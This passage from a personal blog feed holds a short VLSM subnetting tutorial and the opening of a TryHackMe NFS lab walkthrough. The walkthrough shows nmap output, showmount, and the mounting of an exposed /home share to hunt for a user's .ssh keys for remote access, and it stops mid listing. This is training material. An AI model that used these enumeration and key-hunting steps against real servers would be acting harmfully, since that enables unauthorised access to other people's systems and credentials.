</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Host: 10.6.67.243:8087
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Accept: */*
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>X-API-KEY: THM<span style="color:#89dceb;font-weight:bold">{</span>Hello_Im_just_an_API_key<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<br>
]]></content:encoded>
    </item>
    <item>
      <title>[TIL] VLSM</title>
      <link>http://localhost:1313/til-vlsm/</link>
      <pubDate>Thu, 27 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/til-vlsm/</guid>
      <description>VLSM (Variable-Length Subnet Masks) Until now, I have practiced subnetting used FLSM (Fixed-Length Subnet Masks). This means that all of the subnets use the same prefix length (ie. subnetting a Class C network into 4 subnets using /26).
VLSM (Variable-Length Subnet Masks) is the process of creating subnets of different sizes, to make your use of network addresses more efficient.
Here&amp;rsquo;s an example of a small enterprise network. There are two LANs in Tokyo and two LANs in Toronto.</description>
      <content:encoded><![CDATA[<h3 id="vlsm-variable-length-subnet-masks">VLSM (Variable-Length Subnet Masks)</h3>
<p>Until now, I have practiced subnetting used FLSM (Fixed-Length Subnet Masks). This means that all of the subnets use the same prefix length (ie. subnetting a Class C network into 4 subnets using /26).</p>
<p>VLSM (Variable-Length Subnet Masks) is the process of creating subnets of different sizes, to make your use of network addresses more efficient.</p>
<br>
<div style="text-align: center"><img src="./image-34.png"></div>
<p>Here&rsquo;s an example of a small enterprise network. There are two LANs in Tokyo and two LANs in Toronto. We are assigned the <code>192.168.1.0/24</code> network and must divide it into 5 subnets to provide IP addresses for all hosts in the enterprise network.</p>
<p>If we were to try this with FLSM (Fixed-length subnet masks), we would need to borrow 3 bits to make enough subnets. That would leave 5 host bits left. 5 host bits only allow 30 host addresses, so that&rsquo;s not enough addresses for Tokyo LAN A and Toronto LAN B.</p>
<p>However, if we use VLSM we can assign different subnet sizes to each LAN, which will allow us to make sure each LAN has enough addresses available.</p>
<br>
<h3 id="steps-to-subnet-using-vlsm">Steps to subnet using VLSM</h3>
<ol>
<li>Assign the largest subnet at the start of the address space.</li>
<li>Assign the second-largest subnet after it.</li>
<li>Repeat the process until all subnets have been assigned.</li>
</ol>
<p>If we look at our network above, we will assign subnets in this following order:</p>
<ol>
<li>Tokyo LAN A</li>
<li>Toronto LAN B</li>
<li>Toronto LAN A</li>
<li>Tokyo LAN B</li>
<li>point-to-point connection</li>
</ol>
<br>
<h3 id="tokyo-lan-a">Tokyo LAN A</h3>
<p>Because we need to accommodate 110 hosts for Tokyo LAN A, we have to have at least 7 host bits, which leads to /25 prefix length.</p>
<p>Convert the original address to binary bits</p>
<ul>
<li>11000000.10101000.00000001.00000000</li>
</ul>
<p>Network address in binary</p>
<ul>
<li>11000000.10101000.00000001.00000000</li>
</ul>
<p>Broadcast address in binary</p>
<ul>
<li>11000000.10101000.00000001.01111111</li>
</ul>






<pre tabindex="0"><code>Network address: 192.168.1.0/25
Broadcast address: 192.168.1.127/25
First usable address: 192.168.1.1/25
Last usable address: 192.168.1.126/25
Total number of usable host addresses: 2^7 - 2 = 126</code></pre>
<br>
<h3 id="toronto-lan-b">Toronto LAN B</h3>
<p>We have our first subnet, 192.168.1.0/25 for Tokyo LAN A. The network address of Toronto LAN B should be 192.168.1.128, just 1 up Tokyo LAN A&rsquo;s broadcast address. However, we have to calculate what prefix length we should use for Toronto LAN B.</p>
<p>Because Toronto LAN B has to have 45 hosts, that means we have to have 6 host bits. That means, the prefix length of the subnet is going to be /26.</p>
<p>Network address in binary</p>
<ul>
<li>11000000.10101000.00000001.10000000</li>
</ul>
<p>Broadcast address in binary</p>
<ul>
<li>11000000.10101000.00000001.10111111</li>
</ul>






<pre tabindex="0"><code>Network address: 192.168.1.128/26
Broadcast address: 192.168.1.191/26
First usable address: 192.168.1.129/26
Last usable address: 192.168.1.190/26
Total number of usable host addresses: 2^6 - 2 = 62</code></pre>
<br>
<h3 id="toronto-lan-a">Toronto LAN A</h3>
<p>Next is subnetting Toronto LAN A. The broadcast address of the previous subnet, Toronto LAN B, is 192.168.1.191/26. So, the network address of Toronto LAN A is 192.168.1.192, we just need to figure out the prefix length.</p>
<p>Since we need to accommodate 29 hosts, we need to have 5 host bits. 2 ^ 5 - 2 = 30, which means the prefix length of the subnet is going to be /27.</p>
<p>Network address in binary</p>
<ul>
<li>11000000.10101000.00000001.11000000</li>
</ul>
<p>Broadcast address in binary:</p>
<ul>
<li>11000000.10101000.00000001.11011111</li>
</ul>






<pre tabindex="0"><code>Network address: 192.168.1.192/27
Broadcast address: 192.168.1.223/27
First usable address: 192.168.1.193/27
Last usable address: 192.168.1.222/27
Total number of usable host addresses: 30</code></pre>
<br>
<h3 id="tokyo-lan-b">Tokyo LAN B</h3>
<p>The broadcast address of Toronto LAN A is 192.168.1.223/27. To get the network address of Tokyo LAN B, we just need to add 1 to it. 192.168.1.224. Tokyo LAN B needs to have 8 hosts, which means 4 host bits are needed. The prefix length is /28.</p>
<p>Network address in binary</p>
<ul>
<li>11000000.10101000.00000001.11100000</li>
</ul>
<p>Broadcast address in binary</p>
<ul>
<li>11000000.10101000.00000001.11101111</li>
</ul>






<pre tabindex="0"><code>Network address: 192.168.1.224/28
Broadcast address: 192.168.1.239/28
First usable address: 192.168.1.225/28
Last usable address: 192.168.1.238/28
Total number of usable host addresses: 2 ^ 4 - 2 = 14.</code></pre>
<br>
<h3 id="point-to-point-connection">Point-to-point connection</h3>
<p>The broadcast address of Tokyo LAN B is 192.168.1.239. Therefore, the network address of point-to-point connection is 192.168.1.240. Since this is a point-to-point connection, we only need to accommodate 2 hosts. Two answers are possible for this, the first choice is /31 prefix length. However, for the CCNA test, if you are asked what prefix length to use for a subnet that requires two hosts, it is recommended not using a /31 prefix length.</p>
<p>Then, our other option is /30 prefix length because we need 2 host bits. (2 ^ 2 - 2 = 2).</p>
<p>Network address in binary</p>
<ul>
<li>11000000.10101000.00000001.11110000</li>
</ul>
<p>Broadcast address in binary</p>
<ul>
<li>11000000.10101000.00000001.11110011</li>
</ul>






<pre tabindex="0"><code>Network address: 192.168.1.240/30
Broadcast address: 192.168.1.243/30
First usable address: 192.168.1.241/30
Last usable address: 192.168.1.242/30
Total number of usable host addresses: 2</code></pre>
<br>
<div style="text-align: center"><img src="./image-34.png"></div>
Notice that each subnet uses a different prefix length. If we tried to use the same prefix length for each subnet, there wouldn't be enough address space.
<hr>
<h3 id="vlsm-lab">VLSM LAB</h3>
<p><img src="image.png" alt="alt text"></p>
<p>We will assign the subnets in the following order:</p>
<ol>
<li>LAN 2 (64 hosts)</li>
<li>LAN 1 (45 hosts)</li>
<li>LAN 3 (14 hosts)</li>
<li>LAN 4 (9 hosts)</li>
<li>Point-to-point (2 hosts)</li>
</ol>
<h4 id="lan-2">LAN 2</h4>
<p>convert the <code>192.168.5.0/24</code> network address to binary:</p>
<ul>
<li><code>11000000.10101000.00000101.000000</code></li>
</ul>
<p>Because we have to accommodate 64 hosts for LAN 2, we need 7 host bits <code>2^7 - 2 = 126</code>. That means, the prefix length of the subent will be <code>/25</code>.</p>
<p>Network address in binary</p>
<ul>
<li><code>11000000.10101000.00000101.000000</code></li>
</ul>
<p>Broadcast address in binary</p>
<ul>
<li><code>11000000.10101000.00000101.01111111</code></li>
</ul>






<pre tabindex="0"><code>Network address: 192.168.5.0/25
Broadcast address: 192.168.5.127/25
First usable address: 192.168.5.1/25
Last usable address: 192.168.5.126/25</code></pre>
<h4 id="lan-1">LAN 1</h4>
<p>The subnet with the second biggest hosts is LAN 1.
We know the broadcast address of LAN 2, so the network address of LAN 1 is just <code>broadcast address of LAN 2 + 1</code>.</p>
<p>However, we still need to find the prefix length. LAN 1 needs to accomodate 45 hosts, which needs 6 host bits. That leads to <code>/26</code> prefix length.</p>
<p>Convert the network address <code>192.168.5.128/26</code> to binary:</p>
<ul>
<li><code>11000000.10101000.00000101.10000000</code>.</li>
</ul>
<p>Broadcast address in binary:</p>
<ul>
<li><code>11000000.10101000.00000101.10111111</code>.</li>
</ul>






<pre tabindex="0"><code>Network address: 192.168.5.128/26
Broadcast address: 192.168.5.191/26
First usable address: 192.168.5.129/26
Last usable address: 192.168.5.190/26</code></pre>
<h4 id="lan-3">LAN 3</h4>
<p>Network address: <code>192.168.5.192</code>
prefix length: <code>/28</code></p>
<p>Network address in binary:</p>
<ul>
<li><code>11000000.10101000.00000101.11000000</code></li>
</ul>
<p>Broadcast address in binary:</p>
<ul>
<li><code>11000000.10101000.00000101.11001111</code></li>
</ul>






<pre tabindex="0"><code>Network address: 192.168.5.192/28
Broadcast address: 192.168.5.207/28
First usable address: 192.168.5.193/28
Last usable address: 192.168.5.206/28</code></pre>
<h3 id="lan-4">LAN 4</h3>
<p>Network address: <code>192.168.5.208</code>
Prefix length:<code>/28</code></p>
<p>Network address in binary:</p>
<ul>
<li><code>11000000.10101000.00000101.11010000</code></li>
</ul>
<p>Broadcast address in binary:
<code>11000000.10101000.00000101.11011111</code></p>






<pre tabindex="0"><code>Network address: 192.168.5.208/28
Broadcast address: 192.168.5.223/28
First usable address: 192.168.5.209/28
Last usable address: 192.168.5.222/28</code></pre>
<h3 id="point-to-point">Point-to-point</h3>
<p>Network address: <code>192.168.5.224</code>
prefix length: <code>/30</code></p>
<p>Network address in binary:</p>
<ul>
<li><code>11000000.10101000.00000101.11100000</code></li>
</ul>
<p>Broadcast address in binary:</p>
<ul>
<li><code>11000000.10101000.00000101.11100011</code></li>
</ul>






<pre tabindex="0"><code>Network address: 192.168.5.224/30
Broadcast address: 192.168.5.227/30
First usable address: 192.168.5.225/30
Last usable address: 192.168.5.226/30</code></pre>
<hr>
<p>Resources for practicing subnetting</p>
<ul>
<li><a href="http://www.subnettingquestions.com">http://www.subnettingquestions.com</a></li>
<li><a href="http://subnetting.org">http://subnetting.org</a></li>
<li><a href="https://subnettingpractice.com">https://subnettingpractice.com</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>[THM] Network Services 2</title>
      <link>http://localhost:1313/thm-network-services-2/</link>
      <pubDate>Wed, 26 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/thm-network-services-2/</guid>
      <description>This is the second series on Network Services in the Network Exploitation Basics module of the Complete Beginner path. I really learned a lot and a lot of new protocols and tools were introduced.
NFS Understanding NFS What does NFS stand for?
Network File System What process allows an NFS client to interact with a remote directory as though it was a physical drive?
Mounting By using NFS, users and programs can access files on remote systems as if they were local files.</description>
      <content:encoded><![CDATA[<p>This is the second series on Network Services in the <code>Network Exploitation Basics</code> module of the Complete Beginner path. I really learned a lot and a lot of new protocols and tools were introduced.</p>
<h3 id="nfs">NFS</h3>
<hr>
<h4 id="understanding-nfs">Understanding NFS</h4>
<p>What does NFS stand for?</p>






<pre tabindex="0"><code>Network File System</code></pre>
<br>
<p>What process allows an NFS client to interact with a remote directory as though it was a physical drive?</p>






<pre tabindex="0"><code>Mounting</code></pre>
<p>By using NFS, users and programs can access files on remote systems as if they were local files. It does this by mounting all, or a portion of a file system on a server. The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file.</p>
<br>
<p>What does NFS use to represent files and directories on the server?</p>






<pre tabindex="0"><code>file handle</code></pre>
<p>The server checks if the user has permission to mount whatever directory has been requested. It will then return a file handle which uniquely identifies each file and directory that is on the server.
<br>
<br></p>
<p>What protocol does NFS use to communicate between the server and client?</p>






<pre tabindex="0"><code>RPC</code></pre>
<br>
<p>What two pieces of user data does the NFS server take as parameters for controlling user permissions? Format: parameter 1/parameter 2</p>






<pre tabindex="0"><code>user id / group id</code></pre>
<br>
<p>Can a Windows NFS server share files with a Linux client? (Y/N)</p>






<pre tabindex="0"><code>Y</code></pre>
<br>
<p>Can a Linux NFS server share files with a MacOS client? (Y/N)</p>






<pre tabindex="0"><code>Y</code></pre>
<p>Using the NFS protocol, you can transfer files between computers running Windows and other non-Windows operating systems, such as Linux, MacOS or Unix.
A computer running Windows Server can act as an NFS file server for other non-Windows client computers. Likewise, NFS allows a Windows-based computer running Windows server to access files stored on a non-Windows NFS server.
<br>
<br></p>
<p>What is the latest version of NFS? [released in 2016, but is still up to date as of 2020] This will require external research.</p>






<pre tabindex="0"><code>4.2</code></pre>
<br>
<h4 id="enumerating-nfs">Enumerating NFS</h4>
<h5 id="requirements">Requirements</h5>
<p>In order to do a more advanced enumeration of the NFS server, and shares  we&rsquo;re going to need a few tools.</p>
<ol>
<li>
<p>NFS-Common</p>
<p>It is important tohave this package installed on any machine that uses NFS, either asclient orserver. It includes programs such as:lockd,statd,showmount,nfsstat,gssd,idmapdandmount.nfs. Primarily, we are concerned with &ldquo;showmount&rdquo; and&ldquo;mount.nfs&rdquo; as these are going to be most useful to us when it comes toextracting information from the NFS share</p>
</li>
<li>
<p>Port Scanning</p>
</li>
<li>
<p>Mounting NFS shares</p>
<p>Your client&rsquo;s system needs a directory where all the content shared by the host server in the export folder can be accessed. You can create this folder anywhere on your system. Once you&rsquo;ve created this mount point, you can use the &ldquo;mount&rdquo; command to connect the NFS share to the mount point on your machine like so: <code>sudo mount -t nfs IP:share /tmp/mount/ -nolock</code></p>
<p><code>sudo</code> : run as root <br>
<code>mount</code> : execute the mount command <br>
<code>-t nfs</code> : type of device to mount, then specifying that it&rsquo;s NFS <br>
<code>IP:share</code>: the IP address of the NFS server, and the name of the share we wish to mount <br>
<code>-nolock</code>: specifies not to use NLM locking</p>
</li>
</ol>
<br>
<p>Conduct a thorough port scan of your choosing, how many ports are open?</p>






<pre tabindex="0"><code>7</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>PORT STATE SERVICE REASON VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>22/tcp open ssh syn-ack ttl <span style="color:#fab387">64</span> OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu Linux; protocol 2.0<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>| ssh-hostkey:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>| <span style="color:#fab387">2048</span> 73:92:8e:04:de:40:fb:9c:90:f9:cf:42:70:c8:45:a7 <span style="color:#89dceb;font-weight:bold">(</span>RSA<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEQIafB/d+8xhCVa/WJUjV/xtzU7h9fmdPMEVWEobVN59eusBnBD19rp08xrjFOkvHdLSe3XCaDSSreOd4m9If73vzGT/dpXO4kj2Je+p2ALDLLr0vbA+/EVrFJjsbKJ6OLNWGw2nD6romEld++MLOI0SbY9zaM3ov4hwQZ2Fnp9QF5OAt3zqIyxk5Xr99gpm/i4mk3YtA+3I1WHpdLE5Uw41aOVYapowLh+sG1Uyi8dxnI7WJ04DywrUftJam/ajlY6QAiWDR96QRw7RuNJ+8dOLDj7JT+aNREvSTrSWahn+clpIwCgDuVUYy36BEfyTpC/JyTtuS077Bj8vv8NLl
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>| <span style="color:#fab387">256</span> 6d:63:d6:b8:0a:67:fd:86:f1:22:30:2b:2d:27:1e:ff <span style="color:#89dceb;font-weight:bold">(</span>ECDSA<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIL2RAJwSBEjlVNFa6km4BnXrbfxBqanFGsc8V7KPraGwGaJkBCtaUpVRQmPXQHhNePswl4UI2rsxVLcw/DYQ4s<span style="color:#89dceb;font-weight:bold">=</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>| <span style="color:#fab387">256</span> bd:08:97:79:63:0f:80:7c:7f:e8:50:dc:59:cf:39:5e <span style="color:#89dceb;font-weight:bold">(</span>EdDSA<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINqYlGyJzySWsOMejWbc9mf3mFzerVbrty8i6PCOR7lv
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>111/tcp open rpcbind syn-ack ttl <span style="color:#fab387">64</span> 2-4 <span style="color:#89dceb;font-weight:bold">(</span>RPC <span style="color:#6c7086;font-style:italic">#100000)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>| rpcinfo:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>| program version port/proto service
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>| <span style="color:#fab387">100000</span> 2,3,4 111/tcp rpcbind
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>| <span style="color:#fab387">100000</span> 2,3,4 111/udp rpcbind
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>| <span style="color:#fab387">100003</span> <span style="color:#fab387">3</span> 2049/udp nfs
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>| <span style="color:#fab387">100003</span> 3,4 2049/tcp nfs
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>| <span style="color:#fab387">100005</span> 1,2,3 52691/tcp mountd
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>| <span style="color:#fab387">100005</span> 1,2,3 57133/udp mountd
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>| <span style="color:#fab387">100021</span> 1,3,4 34475/tcp nlockmgr
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>| <span style="color:#fab387">100021</span> 1,3,4 48911/udp nlockmgr
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>| <span style="color:#fab387">100227</span> <span style="color:#fab387">3</span> 2049/tcp nfs_acl
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>|_ <span style="color:#fab387">100227</span> <span style="color:#fab387">3</span> 2049/udp nfs_acl
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>2049/tcp open nfs_acl syn-ack ttl <span style="color:#fab387">64</span> <span style="color:#fab387">3</span> <span style="color:#89dceb;font-weight:bold">(</span>RPC <span style="color:#6c7086;font-style:italic">#100227)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>34475/tcp open nlockmgr syn-ack ttl <span style="color:#fab387">64</span> 1-4 <span style="color:#89dceb;font-weight:bold">(</span>RPC <span style="color:#6c7086;font-style:italic">#100021)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>46359/tcp open mountd syn-ack ttl <span style="color:#fab387">64</span> 1-3 <span style="color:#89dceb;font-weight:bold">(</span>RPC <span style="color:#6c7086;font-style:italic">#100005)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>52691/tcp open mountd syn-ack ttl <span style="color:#fab387">64</span> 1-3 <span style="color:#89dceb;font-weight:bold">(</span>RPC <span style="color:#6c7086;font-style:italic">#100005)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>56583/tcp open mountd syn-ack ttl <span style="color:#fab387">64</span> 1-3 <span style="color:#89dceb;font-weight:bold">(</span>RPC <span style="color:#6c7086;font-style:italic">#100005)</span></span></span></code></pre></div>
<br>
<p>Which port contains the service we&rsquo;re looking to enumerate?</p>






<pre tabindex="0"><code>2049</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>| <span style="color:#fab387">100003</span> <span style="color:#fab387">3</span> 2049/udp nfs
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>| <span style="color:#fab387">100003</span> 3,4 2049/tcp nfs</span></span></code></pre></div>
<br>
<p>Now, use <code>/usr/sbin/showmount -e [IP]</code> to list the NFS shares, what is the name of the visible share?</p>






<pre tabindex="0"><code>/home</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-87-146:~# /usr/sbin/showmount -e 10.10.14.167
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>Export list <span style="color:#cba6f7">for</span> 10.10.14.167:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>/home <span style="color:#89b4fa">\*</span></span></span></code></pre></div>
<br>
Time to mount the share to our local machine!
<p>First, use <code>mkdir /tmp/mount</code> to create a directory on your machine to mount the share to. This is in the /tmp directory - so be aware that it will be removed on restart.</p>
<p>Then, use the mount command we broke down earlier to mount the NFS share to your local machine. Change directory to where you mounted the share  what is the name of the folder inside?</p>






<pre tabindex="0"><code>cappucino</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-87-146:~# mkdir /tmp/mount
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>root@ip-10-10-87-146:~# sudo mount -t nfs 10.10.14.167:home /tmp/mount/ -nolock
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>root@ip-10-10-87-146:~# <span style="color:#89dceb">cd</span> /tmp/mount
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>root@ip-10-10-87-146:/tmp/mount# ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>cappucino</span></span></code></pre></div>
<br>
<p>Have a look inside the directory, look at the files. Looks like we&rsquo;re inside a user&rsquo;s home directory&hellip;</p>
<p>Interesting! Let&rsquo;s do a bit of research now, have a look through the folders. Which of these folders could contain keys that would give us remote access to the server?</p>






<pre tabindex="0"><code>.ssh</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-87-146:/tmp/mount/cappucino# ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>root@ip-10-10-87-146:/tmp/mount/cappucino# ls -al
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>total <span style="color:#fab387">36</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>drwxr-xr-x <span style="color:#fab387">5</span> ubuntu ubuntu <span style="color:#fab387">4096</span> Jun <span style="color:#fab387">4</span> <span style="color:#fab387">2020</span> .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>drwxr-xr-x <span style="color:#fab387">3</span> root root <span style="color:#fab387">4096</span> Apr <span style="color:#fab387">21</span> <span style="color:#fab387">2020</span> ..
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>-rw------- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">5</span> Jun <span style="color:#fab387">4</span> <span style="color:#fab387">2020</span> .bash_history
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>-rw-r--r-- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">220</span> Apr <span style="color:#fab387">4</span> <span style="color:#fab387">2018</span> .bash_logout
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>-rw-r--r-- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">3771</span> Apr <span style="color:#fab387">4</span> <span style="color:#fab387">2018</span> .bashrc
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>drwx------ <span style="color:#fab387">2</span> ubuntu ubuntu <span style="color:#fab387">4096</span> Apr <span style="color:#fab387">22</span> <span style="color:#fab387">2020</span> .cache
